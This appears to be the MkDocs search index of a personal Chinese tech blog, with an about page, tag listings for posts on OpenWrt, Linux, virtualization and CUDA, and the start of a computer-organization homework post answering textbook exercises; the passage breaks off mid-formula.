{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u535a\u5ba2","text":""},{"location":"about/","title":"\u5173\u4e8e","text":"<p>\u6211\u672c\u79d1\u6bd5\u4e1a\u4e8e\u91cd\u5e86\u5927\u5b66\uff0817\u7ea7\uff09\uff0c\u76ee\u524d\u4e8e\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u8bfb\u7814\uff0821\u7ea7\uff09\uff0c\u65b9\u5411\u4e3a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7ed3\u6784\u3002</p> <p>\u8054\u7cfb\u65b9\u5f0f - \u6211\u7684 GitHub @TheRainstorm\u3002 - \u6211\u7684 Email yuanfuya@qq.com - \u6211\u7684 B \u7ad9 @TheRainbowsea</p>"},{"location":"series/","title":"\u7cfb\u5217","text":"<p>#\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531</p>"},{"location":"tags/","title":"\u6807\u7b7e","text":""},{"location":"tags/#asc","title":"ASC","text":"<ul> <li>Vacation routine: ASC2020 tips (up to 02/09)</li> </ul>"},{"location":"tags/#c","title":"C","text":"<ul> <li>C\u7f16\u7a0b\u98ce\u683c\u89c4\u8303</li> <li>C&amp;C++</li> </ul>"},{"location":"tags/#c_1","title":"C++","text":"<ul> <li>C&amp;C++</li> </ul>"},{"location":"tags/#ci","title":"CI","text":"<ul> <li>github action\u7f16\u8bd1openwrt</li> </ul>"},{"location":"tags/#eeprom","title":"EEPROM","text":"<ul> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#kvm","title":"KVM","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> <li>libvirt</li> <li>\u6361\u5783\u573e-rk3399 DIY KVM</li> </ul>"},{"location":"tags/#lxd","title":"LXD","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#vipt","title":"VIPT","text":"<ul> <li>\u518d\u6b21\u7406\u89e3Cache\u8bbe\u8ba1</li> </ul>"},{"location":"tags/#x11","title":"X11","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#ac2100","title":"ac2100","text":"<ul> <li>\u8bb0\u5f55\u7ea2\u7c73AC2100\u6298\u817e</li> </ul>"},{"location":"tags/#armbian","title":"armbian","text":"<ul> <li>\u6361\u5783\u573e-rk3399 DIY KVM</li> </ul>"},{"location":"tags/#arp","title":"arp","text":"<ul> <li>NAS\u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6</li> </ul>"},{"location":"tags/#awk","title":"awk","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#bad-apple","title":"bad-apple","text":"<ul> <li>CloudView\u5e73\u53f0\u8fd0\u884cbad apple</li> </ul>"},{"location":"tags/#bash","title":"bash","text":"<ul> <li>bash</li> </ul>"},{"location":"tags/#breed","title":"breed","text":"<ul> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#bridge","title":"bridge","text":"<ul> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> </ul>"},{"location":"tags/#cache","title":"cache","text":"<ul> <li>\u518d\u6b21\u7406\u89e3Cache\u8bbe\u8ba1</li> </ul>"},{"location":"tags/#centos","title":"centos","text":"<ul> <li>\u5b89\u88c5centos\u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6egameboy.live\u8bb0\u5f55</li> </ul>"},{"location":"tags/#clock","title":"clock","text":"<ul> <li>linux\u65f6\u949f\u4ecb\u7ecd</li> </ul>"},{"location":"tags/#cloudfare","title":"cloudfare","text":"<ul> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#cloudview","title":"cloudview","text":"<ul> <li>CloudView\u5e73\u53f0\u8fd0\u884cbad apple</li> </ul>"},{"location":"tags/#cpp","title":"cpp","text":"<ul> <li>Use dlib in C++</li> </ul>"},{"location":"tags/#cpu","title":"cpu","text":"<ul> <li>\u518d\u6b21\u7406\u89e3Cache\u8bbe\u8ba1</li> </ul>"},{"location":"tags/#cuda","title":"cuda","text":"<ul> <li>CUDA\u4f18\u5316</li> <li>CUDA\u67b6\u6784</li> <li>CUDA\u7f16\u7a0b&amp;\u5de5\u5177</li> </ul>"},{"location":"tags/#div10","title":"div10","text":"<ul> <li>\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97div10</li> </ul>"},{"location":"tags/#dlib","title":"dlib","text":"<ul> <li>Use dlib in C++</li> </ul>"},{"location":"tags/#dns","title":"dns","text":"<ul> <li>openwrt DNS\u8be6\u89e3</li> </ul>"},{"location":"tags/#docker","title":"docker","text":"<ul> <li>\u4f7f\u7528docker\u914d\u7f6ehexo\u535a\u5ba2\u73af\u5883</li> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> <li>docker</li> </ul>"},{"location":"tags/#fdisk","title":"fdisk","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#ffmpeg","title":"ffmpeg","text":"<ul> <li>ffmpeg</li> </ul>"},{"location":"tags/#flash\u5206\u533a","title":"flash\u5206\u533a","text":"<ul> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#fsck","title":"fsck","text":"<ul> <li>\u8bb0\u4e00\u6b21linux\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#fstab","title":"fstab","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> </ul>"},{"location":"tags/#fzf","title":"fzf","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> </ul>"},{"location":"tags/#gameboy","title":"gameboy","text":"<ul> <li>\u5b89\u88c5centos\u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6egameboy.live\u8bb0\u5f55</li> </ul>"},{"location":"tags/#gcc","title":"gcc","text":"<ul> <li>Linux\u5b89\u88c5windows\u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a</li> <li>gcc mpi\u6e90\u7801\u7f16\u8bd1</li> </ul>"},{"location":"tags/#git","title":"git","text":"<ul> <li>git</li> </ul>"},{"location":"tags/#github-action","title":"github-action","text":"<ul> <li>github action\u7f16\u8bd1openwrt</li> </ul>"},{"location":"tags/#grub","title":"grub","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> <li>\u8bb0\u4e00\u6b21linux\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#hexo","title":"hexo","text":"<ul> <li>write blog in PC through sshing to a mobile phone</li> <li>\u4f7f\u7528docker\u914d\u7f6ehexo\u535a\u5ba2\u73af\u5883</li> <li>hexo\u4f7f\u7528</li> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#hpl","title":"hpl","text":"<ul> <li>HPL complie</li> </ul>"},{"location":"tags/#immortalwrt","title":"immortalwrt","text":"<ul> <li>\u5c1d\u8bd5\u975e\u5b98\u65b9openwrt</li> </ul>"},{"location":"tags/#ip-rule","title":"ip-rule","text":"<ul> <li>Wireguard\u7ec4\u7f51</li> </ul>"},{"location":"tags/#iptables","title":"iptables","text":"<ul> <li>iptables</li> <li>Wireguard\u7ec4\u7f51</li> </ul>"},{"location":"tags/#ipv6","title":"ipv6","text":"<ul> <li>\u79fb\u52a8\u5149\u732b\u5f00\u542fipv6</li> <li>openwrt DNS\u8be6\u89e3</li> </ul>"},{"location":"tags/#iscsi","title":"iscsi","text":"<ul> <li>\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8(iSCSi)</li> </ul>"},{"location":"tags/#jellyfin","title":"jellyfin","text":"<ul> <li>jellyfin\u76f8\u5173</li> </ul>"},{"location":"tags/#kernel","title":"kernel","text":"<ul> <li>linux\u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u9605\u8bfb</li> </ul>"},{"location":"tags/#latex","title":"latex","text":"<ul> <li>latex\u5b57\u4f53\u5206\u7c7b</li> <li>latex</li> </ul>"},{"location":"tags/#libvirt","title":"libvirt","text":"<ul> <li>libvirt</li> </ul>"},{"location":"tags/#linux","title":"linux","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> <li>\u8bb0\u4e00\u6b21linux\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b</li> </ul>"},{"location":"tags/#linuxdeploy","title":"linuxdeploy","text":"<ul> <li>\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5linux</li> </ul>"},{"location":"tags/#lxc","title":"lxc","text":"<ul> <li>LXC\u4f7f\u7528</li> </ul>"},{"location":"tags/#lxd_1","title":"lxd","text":"<ul> <li>LXC\u4f7f\u7528</li> </ul>"},{"location":"tags/#m2\u63a5\u53e3","title":"m2\u63a5\u53e3","text":"<ul> <li>\u66f4\u65b0\u56fa\u6001\u4e4b\u65c5</li> </ul>"},{"location":"tags/#math","title":"math","text":"<ul> <li>\u5177\u4f53\u6570\u5b66</li> </ul>"},{"location":"tags/#mesh","title":"mesh","text":"<ul> <li>Openwrt Mesh\u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e</li> </ul>"},{"location":"tags/#mips","title":"mips","text":"<ul> <li>mips\u975e\u5bf9\u9f50\u6307\u4ee4\u4e0e\u5927\u5c0f\u7aef</li> <li>ucore-mips \u4ee3\u7801\u5206\u6790</li> </ul>"},{"location":"tags/#mkdocs","title":"mkdocs","text":"<ul> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#mount","title":"mount","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#mpi","title":"mpi","text":"<ul> <li>Linux\u5b89\u88c5windows\u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a</li> <li>gcc mpi\u6e90\u7801\u7f16\u8bd1</li> </ul>"},{"location":"tags/#novnc","title":"noVNC","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#ntfs","title":"ntfs","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#obsidian","title":"obsidian","text":"<ul> <li>hexo\u8fc1\u79fb\u5230mkdoc</li> </ul>"},{"location":"tags/#opencv","title":"opencv","text":"<ul> <li>\u5b89\u88c5\u4f7f\u7528OpenCV(windows)</li> </ul>"},{"location":"tags/#openwrt","title":"openwrt","text":"<ul> <li>Openwrt\u6298\u817e</li> <li>\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b</li> <li>openwrt\u5237\u673a</li> <li>openwrt\u7f16\u8bd1</li> <li>openwrt\u914d\u7f6e</li> <li>openwrt DNS\u8be6\u89e3</li> <li>\u4f7f\u7528openwrt\u8def\u7531\u5668\u548cusb\u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71</li> <li>Openwrt Mesh\u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e</li> <li>\u5c1d\u8bd5\u975e\u5b98\u65b9openwrt</li> <li>Wireguard\u7ec4\u7f51</li> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> <li>github action\u7f16\u8bd1openwrt</li> <li>openwrt x86\u5347\u7ea7</li> </ul>"},{"location":"tags/#overleaf","title":"overleaf","text":"<ul> <li>\u5728\u865a\u62df\u673a\u4e0a\u642d\u5efaoverleaf</li> </ul>"},{"location":"tags/#parted","title":"parted","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#portainer","title":"portainer","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#pve","title":"pve","text":"<ul> <li>PVE</li> </ul>"},{"location":"tags/#python","title":"python","text":"<ul> <li>python\u6b63\u5219\u8868\u8fbe\u5f0f</li> </ul>"},{"location":"tags/#qemu","title":"qemu","text":"<ul> <li>\u865a\u62df\u6e38\u620f\u623f</li> <li>libvirt</li> </ul>"},{"location":"tags/#rdp","title":"rdp","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#re","title":"re","text":"<ul> <li>python\u6b63\u5219\u8868\u8fbe\u5f0f</li> </ul>"},{"location":"tags/#retroarch","title":"retroarch","text":"<ul> <li>retroarch\u914d\u7f6e</li> </ul>"},{"location":"tags/#risc-v","title":"risc-v","text":"<ul> <li>RISC-V trend</li> </ul>"},{"location":"tags/#rk3399","title":"rk3399","text":"<ul> <li>\u6361\u5783\u573e-rk3399 DIY KVM</li> </ul>"},{"location":"tags/#rsync","title":"rsync","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> </ul>"},{"location":"tags/#rtc","title":"rtc","text":"<ul> <li>linux\u65f6\u949f\u4ecb\u7ecd</li> </ul>"},{"location":"tags/#samba","title":"samba","text":"<ul> <li>\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212</li> </ul>"},{"location":"tags/#sed","title":"sed","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#style","title":"style","text":"<ul> <li>C\u7f16\u7a0b\u98ce\u683c\u89c4\u8303</li> </ul>"},{"location":"tags/#termux","title":"termux","text":"<ul> <li>write blog in PC through sshing to a mobile phone</li> </ul>"},{"location":"tags/#tigervnc","title":"tigervnc","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#time","title":"time","text":"<ul> <li>linux\u65f6\u949f\u4ecb\u7ecd</li> </ul>"},{"location":"tags/#tmux","title":"tmux","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> <li>tmux</li> </ul>"},{"location":"tags/#tty","title":"tty","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#ucore","title":"ucore","text":"<ul> <li>ucore lab2\u603b\u7ed3</li> <li>ucore lab3 \u603b\u7ed3</li> <li>ucore-mips \u4ee3\u7801\u5206\u6790</li> </ul>"},{"location":"tags/#usb\u6444\u50cf\u5934","title":"usb\u6444\u50cf\u5934","text":"<ul> <li>\u4f7f\u7528openwrt\u8def\u7531\u5668\u548cusb\u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71</li> </ul>"},{"location":"tags/#virsh","title":"virsh","text":"<ul> <li>libvirt</li> </ul>"},{"location":"tags/#virtualbox","title":"virtualbox","text":"<ul> <li>Virtual Box\u914d\u7f6e\u53cc\u7f51\u5361</li> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#vlan","title":"vlan","text":"<ul> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> </ul>"},{"location":"tags/#vnc","title":"vnc","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#wifi","title":"wifi","text":"<ul> <li>linux\u76f8\u5173</li> </ul>"},{"location":"tags/#windows","title":"windows","text":"<ul> <li>windows\u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4</li> <li>windows\u76f8\u5173</li> </ul>"},{"location":"tags/#wireguard","title":"wireguard","text":"<ul> <li>\u5b9e\u9a8c\u5ba4\u7f51\u7edc\u98ce\u6ce2</li> <li>Wireguard\u7ec4\u7f51</li> </ul>"},{"location":"tags/#wsl","title":"wsl","text":"<ul> <li>WSL\u8bb0\u5f55</li> </ul>"},{"location":"tags/#x11vnc","title":"x11vnc","text":"<ul> <li>vnc\u548crdp\u8fdc\u7a0b</li> </ul>"},{"location":"tags/#x86","title":"x86","text":"<ul> <li>\u8bfbx86\u624b\u518c\u8bb0\u5f55</li> <li>x86\u8bb0\u5f55</li> </ul>"},{"location":"tags/#zsh","title":"zsh","text":"<ul> <li>\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e</li> </ul>"},{"location":"tags/#\u4e95\u5b57\u68cb","title":"\u4e95\u5b57\u68cb","text":"<ul> <li>\u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5</li> </ul>"},{"location":"tags/#\u4f4d\u64cd\u4f5c","title":"\u4f4d\u64cd\u4f5c","text":"<ul> <li>ARM\u76f8\u5173</li> </ul>"},{"location":"tags/#\u4f4d\u8fd0\u7b97","title":"\u4f4d\u8fd0\u7b97","text":"<ul> <li>\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97div10</li> </ul>"},{"location":"tags/#\u4fdd\u7814","title":"\u4fdd\u7814","text":"<ul> <li>\u8bb0\u5f55\u4e00\u6b21\u5931\u7720</li> </ul>"},{"location":"tags/#\u5177\u4f53\u6570\u5b66","title":"\u5177\u4f53\u6570\u5b66","text":"<ul> <li>\u5177\u4f53\u6570\u5b66</li> </ul>"},{"location":"tags/#\u5185\u7f51\u7a7f\u900f","title":"\u5185\u7f51\u7a7f\u900f","text":"<ul> <li>\u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f</li> </ul>"},{"location":"tags/#\u5237\u673a","title":"\u5237\u673a","text":"<ul> <li>\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5linux</li> </ul>"},{"location":"tags/#\u526a\u679d","title":"\u526a\u679d","text":"<ul> <li>\u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5</li> </ul>"},{"location":"tags/#\u5927\u5c0f\u7aef","title":"\u5927\u5c0f\u7aef","text":"<ul> <li>mips\u975e\u5bf9\u9f50\u6307\u4ee4\u4e0e\u5927\u5c0f\u7aef</li> </ul>"},{"location":"tags/#\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","text":"<ul> <li>\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531</li> </ul>"},{"location":"tags/#\u5b57\u4f53","title":"\u5b57\u4f53","text":"<ul> <li>\u5b57\u4f53\u5206\u7c7b</li> </ul>"},{"location":"tags/#\u5d4c\u5165\u5f0f","title":"\u5d4c\u5165\u5f0f","text":"<ul> <li>\u5d4c\u5165\u5f0f\u6280\u672f\u4e0e\u5b9e\u8df5</li> </ul>"},{"location":"tags/#\u5e74\u5ea6\u603b\u7ed3","title":"\u5e74\u5ea6\u603b\u7ed3","text":"<ul> <li>\u5173\u4e8e2020\u5230\u76ee\u524d\u7684\u4e00\u4e2a\u603b\u7ed3</li> </ul>"},{"location":"tags/#\u5e8f\u7ae0","title":"\u5e8f\u7ae0","text":"<ul> <li>\u5e8f\u7ae0</li> </ul>"},{"location":"tags/#\u5ef6\u65f6\u6444\u5f71","title":"\u5ef6\u65f6\u6444\u5f71","text":"<ul> <li>\u4f7f\u7528openwrt\u8def\u7531\u5668\u548cusb\u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71</li> </ul>"},{"location":"tags/#\u64cd\u4f5c\u7cfb\u7edf","title":"\u64cd\u4f5c\u7cfb\u7edf","text":"<ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter1 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter2 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter3 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter4 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf \u7b2c\u4e94\u7ae0\u4f5c\u4e1a CPU\u8c03\u5ea6</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u516d\u7ae0\u4f5c\u4e1a \u8fdb\u7a0b\u540c\u6b65</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e03\u7ae0\u4f5c\u4e1a \u6b7b\u9501</li> </ul>"},{"location":"tags/#\u6697\u5f71\u9a91\u58eb2","title":"\u6697\u5f71\u9a91\u58eb2","text":"<ul> <li>\u66f4\u65b0\u56fa\u6001\u4e4b\u65c5</li> </ul>"},{"location":"tags/#\u6e38\u620f\u623f","title":"\u6e38\u620f\u623f","text":"<ul> <li>\u865a\u62df\u6e38\u620f\u623f</li> </ul>"},{"location":"tags/#\u7535\u89c6","title":"\u7535\u89c6","text":"<ul> <li>\u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891</li> </ul>"},{"location":"tags/#\u7cfb\u7edf\u8fc1\u79fb","title":"\u7cfb\u7edf\u8fc1\u79fb","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> </ul>"},{"location":"tags/#\u7ec4\u6210\u539f\u7406","title":"\u7ec4\u6210\u539f\u7406","text":"<ul> <li>\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406 \u7b2c\u4e00\u7ae0\u4f5c\u4e1a</li> </ul>"},{"location":"tags/#\u7f16\u8bd1\u539f\u7406","title":"\u7f16\u8bd1\u539f\u7406","text":"<ul> <li>\u7f16\u8bd1\u539f\u7406\u603b\u7ed3</li> </ul>"},{"location":"tags/#\u7f51\u6865","title":"\u7f51\u6865","text":"<ul> <li>Virtual Box\u914d\u7f6e\u53cc\u7f51\u5361</li> </ul>"},{"location":"tags/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"<ul> <li>NAS\u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6</li> </ul>"},{"location":"tags/#\u7f51\u7edc\u6302\u8f7d","title":"\u7f51\u7edc\u6302\u8f7d","text":"<ul> <li>\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8(iSCSi)</li> </ul>"},{"location":"tags/#\u7f57\u5c0f\u9ed1","title":"\u7f57\u5c0f\u9ed1","text":"<ul> <li>\u7f57\u5c0f\u9ed1\u6218\u8bb0\uff0c\u7968\u623f\u51b2\u9e2d\uff01</li> </ul>"},{"location":"tags/#\u8f6f\u8def\u7531","title":"\u8f6f\u8def\u7531","text":"<ul> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> </ul>"},{"location":"tags/#\u91cd\u88c5\u7cfb\u7edf","title":"\u91cd\u88c5\u7cfb\u7edf","text":"<ul> <li>windows\u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4</li> </ul>"},{"location":"tags/#\u955c\u50cf","title":"\u955c\u50cf","text":"<ul> <li>openwrt x86\u5347\u7ea7</li> </ul>"},{"location":"tools/","title":"\u5de5\u5177","text":""},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406 \u7b2c\u4e00\u7ae0\u4f5c\u4e1a","text":"<p>\u6559\u6750\uff1a \u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\uff1a\u8f6f\u786c\u4ef6\u63a5\u53e3 \u7b2c5\u7248(mips \u7248) \u65f6\u95f4: 2019/09/08</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-12","title":"Exercise 1.2","text":"<ol> <li>a: \"Assembly lines in automobile manufacturing\" -&gt; \"Performance via Pipelining\"</li> <li>b: \"Suspension bridge cables\" -&gt; \u201cDependability via Redundancy\u201d</li> <li>c: \"Aircraft and marine navigation systems that incorporate wind information\" -&gt; \u201cPerformance via Prediction\u201d</li> <li>d: \"Express elevators in buildings\" -&gt; \u201cPerformance via Parallelism\u201d</li> <li>e: \"Library reserve desk\" -&gt; \u201cHierarchy of Memories\u201d</li> <li>f: \"Increasing the gate area on a CMOS transistor to decrease its switching time\" -&gt; \u201cMake the Common Case Fast\u201d</li> <li>g: \"Adding electromagnetic aircraft catapults (which are electrically-powered as opposed to current steam-powered models), allowed by the increased power generation off ered by the new reactor technology\" -&gt; \u201cDesign for Moore\u2019s Law\u201d</li> <li>h: \"Building self-driving cars whose control systems partially rely on existing sensor systems already installed into the base veh icle, such as lane departure systems and smart cruise control systems\" -&gt; \u201cUse Abstraction to Simplify Design\u201d</li> </ol>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-13","title":"Exercise 1.3","text":"<p>\u4ee5C\u8bed\u8a00\u4e3a\u4f8b: \u2003\u2003\u2003\u2003\u7f16\u8bd1\u2003\u2003\u2003\u2003\u2003\u6c47\u7f16\u2003\u2003\u2003\u2003\u2003\u2003\u94fe\u63a5 $ \u6e90\u4ee3\u7801 \\Longrightarrow \u6c47\u7f16\u8bed\u8a00 \\Longrightarrow \u76ee\u6807\u4ee3\u7801 \\Longrightarrow \u673a\u5668\u4ee3\u7801$ - \u7f16\u8bd1\uff1a\u901a\u8fc7\u7f16\u8bd1\u5668\uff0c\u8bfb\u53d6\u6e90\u7a0b\u5e8f\uff08\u5b57\u7b26\u6d41\uff09\uff0c\u5bf9\u4e4b\u8fdb\u884c\u8bcd\u6cd5\u548c\u8bed\u6cd5\u7684\u5206\u6790\uff0c\u5c06\u9ad8\u7ea7\u8bed\u8a00\u6307\u4ee4\u8f6c\u6362\u4e3a\u529f\u80fd\u7b49\u6548\u7684\u6c47\u7f16\u4ee3\u7801\u7684\u8fc7\u7a0b\u3002 - \u6c47\u7f16\uff1a\u901a\u8fc7\u6c47\u7f16\u5668\u5c06\u6c47\u7f16\u8bed\u8a00\u4ee3\u7801\u7ffb\u8bd1\u6210\u76ee\u6807\u673a\u5668\u6307\u4ee4\u7684\u8fc7\u7a0b\u3002 - \u94fe\u63a5\uff1a\u5c06\u6709\u5173\u7684\u76ee\u6807\u6587\u4ef6\u5f7c\u6b64\u76f8\u8fde\u63a5\uff0c\u4e5f\u5373\u5c06\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5f15\u7528\u7684\u7b26\u53f7\u540c\u8be5\u7b26\u53f7\u5728\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5b9a\u4e49\u8fde\u63a5\u8d77\u6765\uff0c\u4f7f\u5f97\u6240\u6709\u7684\u8fd9\u4e9b\u76ee\u6807\u6587\u4ef6\u6210\u4e3a\u4e00\u4e2a\u80fd\u591f\u88ab\u64cd\u4f5c\u7cfb\u7edf\u88c5\u5165\u6267\u884c\u7684\u7edf\u4e00\u6574\u4f53\u3002</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-14","title":"Exercise 1.4","text":"<p>a) $ frame size = 1280 \\times 1024 \\times 3 \\times 8bit = 3.75MB $ b) $ time = \\frac{ 1280 \\times 1024 \\times 3 \\times 8bit }{100 \\times 10^{6} bit} \\approx 0.31s $ </p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-15","title":"Exercise 1.5","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#151","title":"1.5.1","text":"<p>\u8bbe\\(I\\)\u4e3a\u6307\u4ee4\u6570\uff0c\\(t\\)\u4e3acpu\u6267\u884c\u65f6\u95f4\uff0c\\(f\\)\u4e3a\u65f6\u949f\u9891\u7387,\u5219\uff1a $$     I = \\frac{t \\cdot f}{CPI} $$ $ I_{p1} = {1 \\times 3 \\over 1.5} = 2G \u6761$ $ I_{p2} = {1 \\times 2.5 \\over 1} = 